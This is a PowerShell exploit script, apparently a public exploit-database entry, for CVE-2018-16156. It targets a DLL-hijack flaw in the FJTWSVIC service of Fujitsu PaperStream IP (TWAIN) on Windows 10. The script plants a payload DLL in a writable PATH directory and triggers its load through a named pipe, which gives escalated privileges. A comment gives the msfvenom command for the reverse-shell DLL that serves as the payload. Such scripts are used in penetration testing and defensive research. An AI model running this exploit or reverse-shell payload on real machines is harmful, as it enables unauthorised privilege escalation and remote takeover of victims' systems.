# Exploit Title: PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
# Exploit Author: 1F98D
# Original Author: securifera
# Date: 12 May 2020
# Vendor Hompage: https://www.fujitsu.com/global/support/products/computing/peripheral/scanners/fi/software/fi6x30-fi6x40-ps-ip-twain32.html
# CVE: CVE-2018-16156
# Tested on: Windows 10 x64
# References:
# https://www.securifera.com/advisories/cve-2018-16156/
# https://github.com/securifera/CVE-2018-16156-Exploit

# A DLL hijack vulnerability exists in the FJTWSVIC service running as part of
# the Fujitsu PaperStream IP (TWAIN) software package. This exploit searches
# for a writable location, copies the specified DLL to that location and then
# triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32
# named pipe.

$ErrorActionPreference = "Stop"

# Example payload generated as follows
# msfvenom -p windows/x64/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.49.97 LPORT=8082
$PayloadFile = "C:\Users\Tony\shell.dll"

if ((Test-Path $PayloadFile) -eq $false) {
    Write-Host "$PayloadFile not found, did you forget to upload it?"
    Exit 1
}

# Find Writable Location
$WritableDirectory = $null
$Path = (Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment" -Name "PATH").path
$Path -Split ";" | % {
    try {
        [IO.File]::OpenWrite("$_\x.txt").close()
        Remove-Item "$_\x.txt"
        $WritableDirectory = $_
    } catch {}
}

if ($WritableDirectory -eq $null) {
    Write-Host "No writable directories in PATH, FJTWSVIC is not exploitable"
    Exit 1
}

Write-Host "Writable location found, copying payload to $WritableDirectory"
Copy-Item "$PayloadFile" "$WritableDirectory\UninOldIS.dll"

Write-Host "Payload copied, triggering..."
$client = New-Object System.IO.Pipes.NamedPipeClientStream(".", "FjtwMkic_Fjicube_32", [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
$reader = $null
$writer = $null
try {
    $client.Connect()
    $reader = New-Object System.IO.StreamReader($client)
    $writer = New-Object System.IO.StreamWriter($client)
    $writer.AutoFlush = $true
    $writer.Write("ChangeUninstallString")
    $reader.ReadLine()
} finally {
    $client.Dispose()
}

Write-Host "Payload triggered"